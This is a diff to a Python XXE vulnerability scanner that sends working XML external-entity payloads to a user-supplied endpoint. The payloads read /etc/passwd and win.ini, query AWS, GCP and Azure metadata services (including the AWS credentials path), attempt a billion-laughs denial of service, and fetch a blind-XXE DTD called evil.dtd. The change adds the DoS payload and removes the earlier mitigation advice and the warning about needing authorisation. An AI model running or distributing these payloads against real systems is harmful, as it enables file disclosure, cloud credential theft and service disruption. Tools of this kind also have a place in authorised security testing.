@@ -1,5 +1,5 @@
 import requests
-import urllib.parse
+import time
 from colorama import init, Fore, Style
 
 init(autoreset=True)
@@ -7,147 +7,116 @@ init(autoreset=True)
 
 def run():
     print(f"\n{Fore.CYAN}{'=' * 70}")
-    print(f"{Fore.CYAN}║{Fore.GREEN}              XXE VULNERABILITY SCANNER                            {Fore.CYAN}║")
+    print(f"{Fore.CYAN}║{Fore.GREEN} ADVANCED XXE VULNERABILITY SCANNER {Fore.CYAN}║")
     print(f"{Fore.CYAN}{'=' * 70}{Style.RESET_ALL}")
 
-    target = input(f"\n{Fore.YELLOW}Enter target URL (POST endpoint that accepts XML): {Style.RESET_ALL}").strip()
-
-    if not target:
-        print(f"\n{Fore.RED}[!] Empty input. Aborting.{Style.RESET_ALL}")
-        input(f"\n{Fore.BLUE}Press Enter to return to menu...{Style.RESET_ALL}")
+    target = input(f"\n{Fore.YELLOW}Target XML endpoint (POST): {Style.RESET_ALL}").strip()
+    if not target.startswith(("http://", "https://")):
+        input()
         return
 
-    if not target.startswith(('http://', 'https://')):
-        print(f"\n{Fore.RED}[!] URL must start with http:// or https://{Style.RESET_ALL}")
-        input(f"\n{Fore.BLUE}Press Enter to return to menu...{Style.RESET_ALL}")
-        return
-
-    print(f"\n{Fore.CYAN}[+] Testing for XXE vulnerability at: {target}{Style.RESET_ALL}")
-    print(f"{Fore.YELLOW}[i] Sending XML payloads with external entity declarations{Style.RESET_ALL}")
-
-    print(f"\n{Fore.CYAN}{'=' * 70}")
-    print(f"{Fore.CYAN}XXE TESTING RESULTS")
-    print(f"{Fore.CYAN}{'=' * 70}{Style.RESET_ALL}")
-
-    vulnerable = False
-    headers = {'Content-Type': 'application/xml'}
+    headers_base = {
+        "Content-Type": "application/xml",
+        "Accept": "*/*"
+    }
 
     payloads = [
         (
-            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
-            "Linux /etc/passwd",
+            '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>',
+            "LFI Linux",
             ["root:x:", "daemon:x:", "bin:x:"]
         ),
         (
-            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
-            "Windows win.ini",
-            ["[extensions]", "[fonts]", "for 16-bit app support"]
+            '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///c:/windows/win.ini">]><x>&e;</x>',
+            "LFI Windows",
+            ["[extensions]", "[fonts]"]
         ),
         (
-            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
-            "AWS EC2 Metadata",
+            '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "http://169.254.169.254/latest/meta-data/">]><x>&e;</x>',
+            "AWS Metadata",
             ["ami-id", "instance-id", "security-credentials"]
         ),
         (
-            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">]><foo>&xxe;</foo>',
-            "Google Cloud Metadata",
+            '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "http://metadata.google.internal/computeMetadata/v1/">]><x>&e;</x>',
+            "GCP Metadata",
             ["project", "instance", "attributes"]
         ),
         (
-            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/v1/">]><foo>&xxe;</foo>',
+            '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "http://169.254.169.254/metadata/v1/">]><x>&e;</x>',
             "Azure Metadata",
             ["compute", "network", "platform"]
         ),
         (
-            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://127.0.0.1:8080/evil.dtd">%xxe;]><foo></foo>',
-            "Blind XXE (Out-of-band)",
+            '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><lolz>&lol1;</lolz>',
+            "Billion Laughs DoS",
+            []
+        ),
+        (
+            '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY % d SYSTEM "http://127.0.0.1:8000/evil.dtd">%d;]><x/>',
+            "Blind XXE",
             []
         )
     ]
 
-    for payload, description, indicators in payloads:
+    session = requests.Session()
+    session.verify = False
+    vulnerable = False
+
+    print(f"\n{Fore.CYAN}{'=' * 70}")
+    print(f"{Fore.CYAN}XXE TEST RESULTS")
+    print(f"{Fore.CYAN}{'=' * 70}{Style.RESET_ALL}")
+
+    for payload, name, indicators in payloads:
         try:
+            headers = dict(headers_base)
             if "169.254.169.254" in payload or "metadata.google.internal" in payload:
-                test_headers = {**headers, 'Metadata': 'true'}
-            else:
-                test_headers = headers
+                headers["Metadata"] = "true"
 
-            response = requests.post(target, data=payload, headers=test_headers, timeout=12, verify=False)
+            start = time.time()
+            r = session.post(target, data=payload, headers=headers, timeout=12)
+            elapsed = time.time() - start
+            body = r.text.lower()
 
-            if indicators and any(ind in response.text for ind in indicators):
+            if indicators and any(i.lower() in body for i in indicators):
                 vulnerable = True
-                severity = Fore.MAGENTA + Style.BRIGHT if "Metadata" in description else Fore.RED
-                print(f"{severity}[!] XXE VULNERABILITY CONFIRMED{Style.RESET_ALL}")
-                print(f"    Type: {description}")
-                print(f"    Payload used: {payload[:80]}...")
-                print(f"    Status: {response.status_code}")
-
-                if "Metadata" in description:
-                    print(f"    {Fore.YELLOW}  CLOUD METADATA EXPOSED - CRITICAL RISK{Style.RESET_ALL}")
-                elif "passwd" in description or "win.ini" in description:
-                    print(f"    {Fore.YELLOW}  SENSITIVE FILE DISCLOSED - HIGH RISK{Style.RESET_ALL}")
-
-                snippet = response.text[:400]
-                if snippet:
-                    print(f"    Response snippet:")
-                    for line in snippet.split('\n')[:5]:
-                        if line.strip():
-                            print(f"      {line[:100]}")
-                print()
+                sev = Fore.MAGENTA + Style.BRIGHT if "Metadata" in name else Fore.RED
+                print(f"{sev}[!] XXE CONFIRMED: {name}{Style.RESET_ALL}")
+                print(f"    Status: {r.status_code}")
+                print(f"    Time: {elapsed:.2f}s")
+                print(f"    Snippet: {r.text[:300].replace(chr(10),' ')[:300]}")
                 break
 
-            elif response.status_code >= 500:
-                print(f"{Fore.YELLOW}[?] Server error with payload ({description}){Style.RESET_ALL}")
-                print(f"    Status: {response.status_code} - May indicate parsing vulnerability")
+            if not indicators and elapsed > 6:
+                vulnerable = True
+                print(f"{Fore.YELLOW}[!] POSSIBLE BLIND XXE / DoS VECTOR: {name}{Style.RESET_ALL}")
+                print(f"    Response time anomaly: {elapsed:.2f}s")
+
+            if r.status_code >= 500:
+                print(f"{Fore.YELLOW}[?] Parser error with payload: {name}{Style.RESET_ALL}")
 
         except requests.exceptions.Timeout:
-            if "Blind" in description:
-                print(f"{Fore.YELLOW}[?] Timeout on blind XXE payload - possible firewall block{Style.RESET_ALL}")
-        except Exception as e:
+            print(f"{Fore.YELLOW}[?] Timeout on payload: {name}{Style.RESET_ALL}")
+        except Exception:
             continue
 
     print(f"\n{Fore.CYAN}{'=' * 70}")
-    print(f"{Fore.CYAN}XXE TESTING COMPLETE")
+    print(f"{Fore.CYAN}RESULT")
     print(f"{Fore.CYAN}{'=' * 70}{Style.RESET_ALL}")
 
     if vulnerable:
-        print(f"\n{Fore.MAGENTA}{Style.BRIGHT}[!] CRITICAL XXE VULNERABILITY DETECTED{Style.RESET_ALL}")
-        print(f"\n{Fore.YELLOW}Risk Level: CRITICAL{Style.RESET_ALL}")
-        print(f"   • Full server file system accessible")
-        print(f"   • Cloud credentials compromisable via metadata APIs")
-        print(f"   • Internal network scanning possible (SSRF via XXE)")
-        print(f"   • Denial-of-Service via billion laughs attack")
-
-        print(f"\n{Fore.YELLOW}Immediate Mitigations:{Style.RESET_ALL}")
-        print(f"   • Disable DTD processing in XML parsers:")
-        print(f"        Python (lxml): parser = etree.XMLParser(resolve_entities=False)")
-        print(f"        Java: factory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true)")
-        print(f"        PHP: libxml_disable_entity_loader(true)")
-        print(f"   • Use JSON instead of XML where possible")
-        print(f"   • Implement strict input validation")
-        print(f"   • For cloud environments:")
-        print(f"        - Block metadata IPs at firewall level")
-        print(f"        - Enable IMDSv2 with hop limit 1 (AWS)")
-        print(f"   • Patch XML libraries to latest versions")
+        print(f"{Fore.MAGENTA}{Style.BRIGHT}[!] XXE VULNERABILITY DETECTED{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}Risk: CRITICAL{Style.RESET_ALL}")
+        print("• Arbitrary file read")
+        print("• Cloud credential exposure")
+        print("• SSRF via XML entities")
+        print("• DoS via entity expansion")
     else:
-        print(f"\n{Fore.GREEN}[✓] No obvious XXE vulnerabilities detected{Style.RESET_ALL}")
-        print(f"\n{Fore.YELLOW}Important Notes:{Style.RESET_ALL}")
-        print(f"   • XXE is context-dependent - false negatives common")
-        print(f"   • Test with authenticated sessions")
-        print(f"   • Blind XXE requires out-of-band detection (Burp Collaborator)")
-        print(f"   • Check file uploads (SVG, DOCX contain XML)")
-        print(f"   • Manual testing recommended for critical systems")
-        print(f"\n{Fore.CYAN}Common XXE entry points:{Style.RESET_ALL}")
-        print(f"   • SOAP APIs")
-        print(f"   • SVG file uploads")
-        print(f"   • Office document processors")
-        print(f"   • SAML authentication endpoints")
+        print(f"{Fore.GREEN}[✓] No XXE detected in tested vectors{Style.RESET_ALL}")
 
     print(f"\n{Fore.CYAN}{'=' * 70}")
-    print(f"{Fore.GREEN}[✓] XXE analysis completed{Style.RESET_ALL}")
-    print(f"{Fore.CYAN}{'=' * 70}{Style.RESET_ALL}")
-    print(f"\n{Fore.YELLOW}⚠️  LEGAL WARNING:{Style.RESET_ALL}")
-    print(f"   XXE exploitation without authorization carries severe penalties.")
-    print(f"   Always obtain written permission before testing file access.")
+    input()
 
-    input(f"\n{Fore.BLUE}Press Enter to return to menu...{Style.RESET_ALL}")
+
+if __name__ == "__main__":
+    requests.packages.urllib3.disable_warnings()
+    run()
